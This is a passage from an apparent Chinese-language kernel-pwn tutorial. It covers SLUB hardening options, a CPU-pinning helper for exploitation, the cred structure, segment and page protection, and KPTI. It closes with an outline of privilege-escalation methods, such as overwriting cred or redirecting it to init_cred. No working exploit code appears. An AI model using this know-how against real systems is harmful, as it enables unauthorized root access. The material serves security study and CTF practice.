<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>set_freepointer</code> 函数中加了一个 <code>BUG_ON</code> 的检查，这里是检查 double free 的，当前 free 的 object 的内存地址和 freelist 指向的第一个 object 的地址不能一样，这和 glibc 类似。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着是 <code>freelist_ptr</code> ,它会返回当前 object 的下一个 free object 的地址, 加上 hardened 之后会和之前初始化的 random 值做异或。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			(<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="SLAB-FREELIST-RANDOM"><a href="#SLAB-FREELIST-RANDOM" class="headerlink" title="SLAB_FREELIST_RANDOM"></a>SLAB_FREELIST_RANDOM</h5><p><code>CONFIG_SLAB_FREELIST_RANDOM=y</code> 编译选项开启 <code>Random freelist</code> 保护。这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的  slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object  之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址需要注意的是这种保护发生在<code>slub allocator</code> 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/Random_freelist.png"
                      alt="Random_freelist"
                ></p>
<h5 id="INIT-ON-ALLOC-DEFAULT-ON"><a href="#INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="INIT_ON_ALLOC_DEFAULT_ON"></a>INIT_ON_ALLOC_DEFAULT_ON</h5><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h5 id="GFP-KERNEL-GFP-KERNEL-ACCOUNT-的隔离"><a href="#GFP-KERNEL-GFP-KERNEL-ACCOUNT-的隔离" class="headerlink" title="GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离"></a>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离</h5><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code>。</p>
<p>在 5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中取消了隔离机制，自内核版本 5.14 起，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离。</li>
</ul>
<h5 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h5><p>根据描述，如果在使用 <code>kmem_cache_create</code> 创建一个 cache 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Currently, if we want to account all objects of a particular kmem cache,</span><br><span class="line">we have to pass __GFP_ACCOUNT to each kmem_cache_alloc call, which is</span><br><span class="line">inconvenient. This patch introduces SLAB_ACCOUNT flag which if passed to</span><br><span class="line">kmem_cache_create will force accounting for every allocation from this</span><br><span class="line">cache even if __GFP_ACCOUNT is not passed.</span><br><span class="line"></span><br><span class="line">This patch does not make any of the existing caches use this flag - it</span><br><span class="line">will be done later in the series.</span><br><span class="line"></span><br><span class="line">Note, a cache with SLAB_ACCOUNT cannot be merged with a cache w/o</span><br><span class="line">SLAB_ACCOUNT, i.e. using this flag will probably reduce the number of</span><br><span class="line">merged slabs even if kmem accounting is not used (only compiled in).</span><br></pre></td></tr></table></figure></div>

<p>在早期，许多结构体（如 <strong>cred 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache。在 Linux 4.5 版本引入了这个 flag 后，许多结构体就单独使用了自己的 cache。然而，根据上面的描述，这一特性似乎最初并不是为了安全性引入的。</p>
<p>以下结构体都拥有独立的 <code>cache</code>。</p>
<ul>
<li><code>threadinfo</code></li>
<li><code>task_struct</code></li>
<li><code>task_delay_info</code></li>
<li><code>pid</code></li>
<li><code>cred</code></li>
<li><code>mm_struct</code></li>
<li><code>vm_area_struct</code> and <code>vm_region (nommu)</code></li>
<li><code>anon_vma</code> and <code>anon_vma_chain</code></li>
<li><code>signal_struct</code></li>
<li><code>sighand_struct</code></li>
<li><code>fs_struct</code></li>
<li><code>files_struct</code></li>
<li><code>fdtable</code> and <code>fdtable-&gt;full_fds_bits</code></li>
<li><code>dentry</code> and <code>external_name</code></li>
<li>inode for all filesystems</li>
</ul>
<h5 id="STATIC-USERMODEHELPER"><a href="#STATIC-USERMODEHELPER" class="headerlink" title="STATIC_USERMODEHELPER"></a>STATIC_USERMODEHELPER</h5><p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code> 的利用（只读区域）</p>
<p><strong>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</strong></p>
<p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h3 id="绑核"><a href="#绑核" class="headerlink" title="绑核"></a>绑核</h3><p>对于多核cpu而言，为了调试和利用方便，我们一般要进行绑核操作，即将进程的堆块分配绑定在某一个核上，从而减轻分配和释放导致的堆块乱序。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_cpu(sched_getcpu());</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h2><p>这部分关于进程较为详细的讲解在<a href="https://jelasin.github.io/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/">这里</a>。</p>
<p><code>kernel</code> 记录了进程的权限，更具体的，是用 <code>cred</code> 结构体记录的，每个进程中都有一个 <code>cred</code> 结构，内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，这个结构保存了该进程的权限等信息，如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> &#123;</span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*session_keyring; <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*process_keyring; <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_struct</span> *user;	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_namespace</span> *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">ucounts</span> *ucounts;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">group_info</span> *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span>	rcu;		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<p><strong>一个进程而言应当有三个 <code>cred</code> ：</strong></p>
<ul>
<li><code>ptracer_cred</code>： 使用 <code>ptrace</code> 系统调用跟踪该进程的上级进程的 <code>cred</code>（ gdb 调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）。</li>
<li><code>real_cred</code>：即客体凭证（objective cred），通常是一个进程最初启动时所具有的权限。</li>
<li><code>cred</code>：即主体凭证（subjective cred），该进程的有效 <code>cred</code> ，<code>kernel</code> 以此作为进程权限的凭证。</li>
</ul>
<p><strong>一个 <code>cred</code> 结构体中记载了一个进程四种不同的用户 ID：</strong></p>
<ul>
<li>用户真实 ID（<code>real UID</code>）:标识一个进程启动时的用户 ID</li>
<li>保存用户 ID（<code>saved UID</code>）：标识一个进程最初的有效用户 ID</li>
<li>有效用户 ID（<code>effective UID</code>）：标识一个进程正在运行时所属的用户 ID</li>
<li>文件系统用户 ID（<code>UID for VFS ops</code>）：标识一个进程创建文件时进行标识的用户 ID</li>
</ul>
<p>通常情况下这四个值都是相同的。用户组 ID 同样分为四个：真实组、保存组、有效组、文件系统组与上面类似。</p>
<h2 id="权限保护机制"><a href="#权限保护机制" class="headerlink" title="权限保护机制"></a>权限保护机制</h2><h3 id="段保护机制"><a href="#段保护机制" class="headerlink" title="段保护机制"></a>段保护机制</h3><ul>
<li><strong>段（Segment）</strong> 是 x86 架构中内存管理的基础单元。每个段定义了一个线性地址范围，程序通过段选择子和偏移量访问内存。</li>
<li>CPU 使用段保护机制，通过段选择子（Segment Selector）和段描述符（Descriptor）来控制不同权限级别（Ring）的内存访问，防止越权操作。</li>
</ul>
<h4 id="段选择子（Segment-Selector）"><a href="#段选择子（Segment-Selector）" class="headerlink" title="段选择子（Segment Selector）"></a>段选择子（Segment Selector）</h4><p>段选择子是存储在 CPU 段寄存器（代码段 <code>cs</code>、数据段 <code>ds</code>、栈段 <code>ss</code> 等）中的低 16 位值，标识了当前程序使用的段。它是程序访问内存段的入口，索引全局或局部段描述符表（GDT 或 LDT）。</p>
<p>段选择子的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/4f2684f1ab4ad202e7f03c900f782bdb.png"
                      alt="img"
                ></p>
<ul>
<li><strong>Index（段索引，13 位）</strong>：指向段描述符表（GDT 或 LDT）中的一个条目，标识具体的段。</li>
<li><strong>TI（Table Indicator，1 位）</strong>：决定段描述符表的类型：<ul>
<li>值为 <code>0</code> 表示选择 <strong>GDT（Global Descriptor Table，全局描述符表）</strong>。</li>
<li>值为 <code>1</code> 表示选择 <strong>LDT（Local Descriptor Table，局部描述符表）</strong>。</li>
</ul>
</li>
<li><strong>RPL（Requested Privilege Level，请求权限级别，2 位）</strong>：<ul>
<li>指定程序期望访问目标段时的权限级别，范围为 <code>0-3</code>。</li>
<li>通常，RPL 由调用方设定，用于在段访问中动态降低权限。</li>
</ul>
</li>
</ul>
<h4 id="段描述符（Descriptor）"><a href="#段描述符（Descriptor）" class="headerlink" title="段描述符（Descriptor）"></a>段描述符（Descriptor）</h4><p>每个段在 GDT 或 LDT 中对应一个段描述符。描述符包含了段的基地址、大小、类型和权限等信息。</p>
<p>段描述符的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5a166703c04f45dcaa7dcbf456f5b673.png"
                      alt="img"
                ></p>
<ul>
<li><p><strong>Base Address（基地址，32 位）</strong>：段的起始地址。在 64 位模式下，基地址通常被固定为 <code>0</code>，即扁平内存模型。</p>
</li>
<li><p><strong>Segment Limit（段大小，20 位）</strong>：定义段的大小（单位为字节）。在 64 位模式下，通常被忽略，因为地址空间被扩展到 48 位或更高。</p>
</li>
<li><p><strong>Access Rights（访问权限，8 位）</strong>：包含段的类型和权限字段：</p>
<ul>
<li><p><strong>类型位（Type）</strong>：定义段的用途，如代码段、数据段或系统段。不同的类型有不同的内存权限。</p>
</li>
<li><p>S 位（Descriptor Type）</p>
<p>：区分系统段（S&#x3D;0）和普通段（S&#x3D;1）。</p>
<ul>
<li><strong>S &#x3D; 0</strong>：系统段（System Segment），包含特定于系统使用的结构或功能，例如任务状态段（TSS）、中断描述符表（IDT）或局部描述符表（LDT）。</li>
<li><strong>S &#x3D; 1</strong>：代码段或数据段，表示常规的用户态或内核态段，用于存储可执行代码或数据。</li>
</ul>
</li>
<li><p><strong>DPL（Descriptor Privilege Level）</strong>：段的权限级别，范围为 <code>0-3</code>，表示对该段的访问要求。</p>
</li>
</ul>
</li>
</ul>
<h4 id="权限类型"><a href="#权限类型" class="headerlink" title="权限类型"></a>权限类型</h4><ul>
<li>CPL（Current Privilege Level）<ul>
<li>表示当前程序的运行权限级别，通常由 CS 寄存器的低两位（代码段段选择子）决定。</li>
<li><strong>CPL</strong> 的值必须低于或等于段描述符中的 DPL 才能访问该段。</li>
</ul>
</li>
<li>RPL（Requested Privilege Level）<ul>
<li>请求访问段时指定的权限级别。通常由访存时使用的段寄存器的段选择子决定</li>
<li><strong>RPL</strong> 的值不能高于段的 DPL。</li>
</ul>
</li>
<li>DPL（Descriptor Privilege Level）<ul>
<li>描述符中定义的段权限级别。</li>
</ul>
</li>
</ul>
<p>简单总结一下，就是当前的执行代码的权限（CPL）和请求访问内存的权限（RPL）都不能低于（值要小于等于）段描述符描述的目标内存的权限。</p>
<h4 id="权限检查过程"><a href="#权限检查过程" class="headerlink" title="权限检查过程"></a>权限检查过程</h4><p>这里以 <code>mov rax, qword ptr ds:[0xdeadbeef]</code> 为例介绍一下段保护机制权限检查的过程。</p>
<ol>
<li><strong>读取 <code>DS</code> 段选择子</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。</li>
<li><strong>读取段描述符</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。这里先根据段选择子的 <code>TI</code> 位确定是 GDT，然后根据 <code>Index</code> 字段中 GDT 中找到段描述符。</li>
<li><strong>检查 S 位（Descriptor Type）</strong>：因为是访存操作，所以要求 S 位为 1（数据段）。</li>
<li><strong>检查 RPL（Requested Privilege Level）</strong>：CPU 会比较 <code>max(CPL, RPL)</code> 和目标段描述符的 <code>DPL</code>（Descriptor Privilege Level）。如果结果大于目标段的 DPL，则触发 **General Protection Fault (GPF)**。</li>
<li><strong>检查段描述符类型：</strong>根据段描述符的 <strong>Access Rights</strong> 字段的<strong>类型位（Type）</strong>确认操作（读取数据）符合段的权限（RW 位）。</li>
</ol>
<h3 id="页保护机制"><a href="#页保护机制" class="headerlink" title="页保护机制"></a>页保护机制</h3><p>在 64 位系统（如 x86_64 架构）中，<strong>页保护机制</strong>是内存管理的核心，通过分页（Paging）机制实现虚拟地址到物理地址的映射，同时提供<strong>细粒度的权限控制</strong>（例如用户空间与内核空间的隔离）。</p>
<p>提示</p>
<p>关于分页机制会在内存管理部分详细介绍，这里仅介绍权限管理相关内容。</p>
<h4 id="权限字段"><a href="#权限字段" class="headerlink" title="权限字段"></a>权限字段</h4><p>每个页表条目（Page Table Entry, PTE）包含物理地址和权限信息：</p>
<ul>
<li><strong>P（Present）</strong>：第 0 位，表示页是否有效。如果为 <code>0</code>，表示页不在内存中（可能在磁盘上），访问时会触发 <strong>Page Fault</strong>。</li>
<li><strong>R&#x2F;W（Read&#x2F;Write）</strong>：第 1 位，表示页是否可写。如果为 <code>0</code>，则该页只读。</li>
<li><strong>U&#x2F;S（User&#x2F;Supervisor）</strong>：第 2 位，表示用户态（Ring 3）是否可以访问：<ul>
<li><strong>U &#x3D; 1</strong>：用户态可访问。</li>
<li><strong>U &#x3D; 0</strong>：仅内核态（Ring 0）可访问。</li>
</ul>
</li>
<li><strong>NX（No Execute）</strong>：第 63 位，表示页是否可执行：如果为 <code>1</code>，则该页不可执行（需要 CPU 支持 NX 位）。</li>
</ul>
<h4 id="Linux-的-KPTI-机制"><a href="#Linux-的-KPTI-机制" class="headerlink" title="Linux 的 KPTI 机制"></a>Linux 的 KPTI 机制</h4><p><strong>Kernel Page Table Isolation（KPTI）</strong> 是一种内核内存隔离机制，用于解决 <strong>Meltdown 漏洞</strong>。</p>
<blockquote>
<p>Meltdown 是一种硬件级漏洞，该漏洞利用了现代处理器的分支预测和缓存特性，可以通过侧信道攻击绕过用户态与内核态的隔离，使得用户态程序可以读取内核内存中的敏感数据。</p>
<ul>
<li>当用户态访问内核地址时，尽管会触发权限检查失败，但在实际触发前，CPU 已经通过分支预测机制将数据加载到缓存中。</li>
<li>攻击者可以通过读取缓存侧信道（如时间测量等技术）获取这些数据。</li>
</ul>
</blockquote>
<p>KPTI 的核心思想是：</p>
<ul>
<li>在用户态运行时，将内核页表从地址空间中隔离，防止用户态程序对内核地址空间的任何访问。</li>
<li>仅在需要切换到内核态时（如系统调用或中断处理），恢复内核页表。</li>
</ul>
<p>在传统未开启 KPTI 的 Linux 系统中，内核页表和用户页表共存于同一张全局页表（PGD）。开启 KPTI 后，内核为用户态和内核态分别维护两张独立的页全局目录（PGD）。</p>
<ul>
<li><strong>内核页表</strong>：包含用户和内核地址空间的完整映射。</li>
<li><strong>用户页表</strong>：完整映射用户地址空间。但内核地址空间仅保留必要的条目（如系统调用入口和中断处理）。</li>
</ul>
<p>由于每张页全局目录表占用 4 KB，两张页表连续分配在内存中，因此两张全局页目录表的地址仅在第 13 位不同。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/KPTI.drawio.png"
                      alt="img"
                ></p>
<ul>
<li>用户态进入内核态：当用户态程序通过 <strong>系统调用</strong> 或 <strong>中断</strong> 进入内核态时，会执行用户态页表映射的系统调用入口代码。在这段代码会将 <strong>CR3 寄存器的第 13 位取反</strong>，切换到内核页表，这样就可以访问完整的内核空间。</li>
<li>内核态返回用户态：内核完成系统调用或中断处理后，需要切换回用户态，此时内核通过<strong>取反 CR3 的第 13 位</strong>，切换回用户页表。切换完成后，内核地址空间的绝大部分被剥离，仅保留必要的条目。</li>
</ul>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-others/" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>提权方式大致有两个方向：</p>
<ul>
<li>直接修改 cred 结构体的内容。</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred。</li>
</ul>
<p>修改的方式有很多种，比如说</p>
<ul>
<li><p>在我们具有任意地址读写后，可以直接修改 cred。</p>
</li>
<li><p>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</p>
</li>
<li><p>修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于我们能够直接修改 cred 指针以及知道 init_cred 地址的情况。</p>
</li>
<li><p>伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。</p>
</li>
</ul>
<p>如果我们可以改变特权进程的执行轨迹，也可以实现提权。这里我们从以下角度来考虑如何改变特权进程的执行轨迹。</p>
<ul>
<li>改数据</li>
<li>改代码</li>
</ul>
<h3 id="进程cred指针定位"><a href="#进程cred指针定位" class="headerlink" title="进程cred指针定位"></a>进程cred指针定位</h3><ul>
<li><strong>直接定位</strong></li>
</ul>
